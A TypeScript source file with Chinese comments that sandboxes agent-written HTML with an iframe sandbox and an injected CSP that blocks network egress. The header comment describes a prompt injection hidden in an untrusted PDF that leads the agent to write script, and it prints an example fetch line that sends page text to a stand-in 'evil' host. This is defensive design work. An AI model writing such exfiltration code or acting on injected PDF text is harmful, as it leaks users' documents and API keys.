/** agent 写的 HTML，在渲染之前要过的那道手续。
 *
 * # 这是这条链上最危险的字节
 *
 * agent 读的是**不受信的 PDF**。一篇论文里埋一句提示注入，就能让它写出任意
 * 脚本。而浏览器里 localStorage 存着用户的 API Key（明文存是有意的设计）。
 * 所以「agent 写的 HTML 在应用自己的源上执行」这件事必须在结构上不可能发生，
 * 不能靠「agent 应该不会这么干」。
 *
 * # 三道，缺一不可
 *
 * 1. **后端**：`forces_attachment("html")`，堵死在 API 源上内联打开（ai_board.rs）。
 *    前端走 `fetch()` 拿字节，它不看 Content-Disposition。
 * 2. **不同源**：`sandbox="allow-scripts"` 且**不给 `allow-same-origin`**。
 *    这时 iframe 拿到一个唯一的不透明源，读不到应用的 localStorage、碰不到
 *    父页面 DOM。两个值同时给**等于没有沙箱** —— 这是最容易犯的错，有门禁守着。
 * 3. **断网**：注入 CSP。沙箱挡住了「读你的数据」，没挡住「往外发」——
 *    一个 `fetch("https://evil/?" + document.body.innerText)` 照样能把这篇论文
 *    的内容送走。CSP 把出网整个关掉。
 *
 * # 代价：agent 不能引 CDN
 *
 * 所有东西得内联。这反而是对的：产物自包含，存下来离线也能看。AGENTS.md 里
 * 说清楚了。
 */

/** iframe 的 sandbox 值。
 *
 * **不要加 allow-same-origin。** 它和 allow-scripts 同时出现时，iframe 里的
 * 脚本可以拿到 `parent.document`，进而移除自己的 sandbox 属性并重新加载 ——
 * 沙箱等于没有。
 *
 * allow-scripts 是必须的：不给脚本就只能看静态 HTML，图表库全废，这个功能就
 * 没意义了。
 */
export const BOARD_HTML_SANDBOX = "allow-scripts";

/** 注进去的 CSP。
 *
 * - `default-src 'none'`：默认什么都不许加载，出网整个关掉
 * - `img-src data: blob:`：图表库常把图画成 data URL
 * - `style-src 'unsafe-inline'` / `script-src 'unsafe-inline'`：内联的样式和脚本
 *   要能跑。`'unsafe-inline'` 在这里不降低安全性 —— 我们本来就是在执行一份
 *   完全由 agent 写的文档，没有「只信任一部分脚本」这回事；真正的边界是不同源
 *   加上不许出网。
 * - `font-src data:`：内联字体
 *
 * 注意**没有** `connect-src`、`frame-src`、`form-action` 的放行项，
 * `default-src 'none'` 会兜住它们。
 */
export const BOARD_HTML_CSP = [
  "default-src 'none'",
  "img-src data: blob:",
  "style-src 'unsafe-inline'",
  "script-src 'unsafe-inline'",
  "font-src data:",
].join("; ");

/** 把 CSP 塞进文档头部。
 *
 * 用 `<meta http-equiv>` 而不是响应头：这份 HTML 是我们用 srcdoc 灌进去的，
 * 根本没有经过 HTTP 响应，没有头可加。
 *
 * **必须插在 `<head>` 的最前面**：meta CSP 只约束它**之后**的内容，插晚了
 * 前面的 `<script>` 已经跑过了。所以这里不找 `<head>`，直接怼在最前 ——
 * 位置在 doctype 之前也没关系，浏览器照样解析，而「一定最早」比「格式漂亮」
 * 重要得多。
 */
export function withBoardHtmlCsp(html: string): string {
  return `<meta http-equiv="Content-Security-Policy" content="${BOARD_HTML_CSP}">\n${html}`;
}
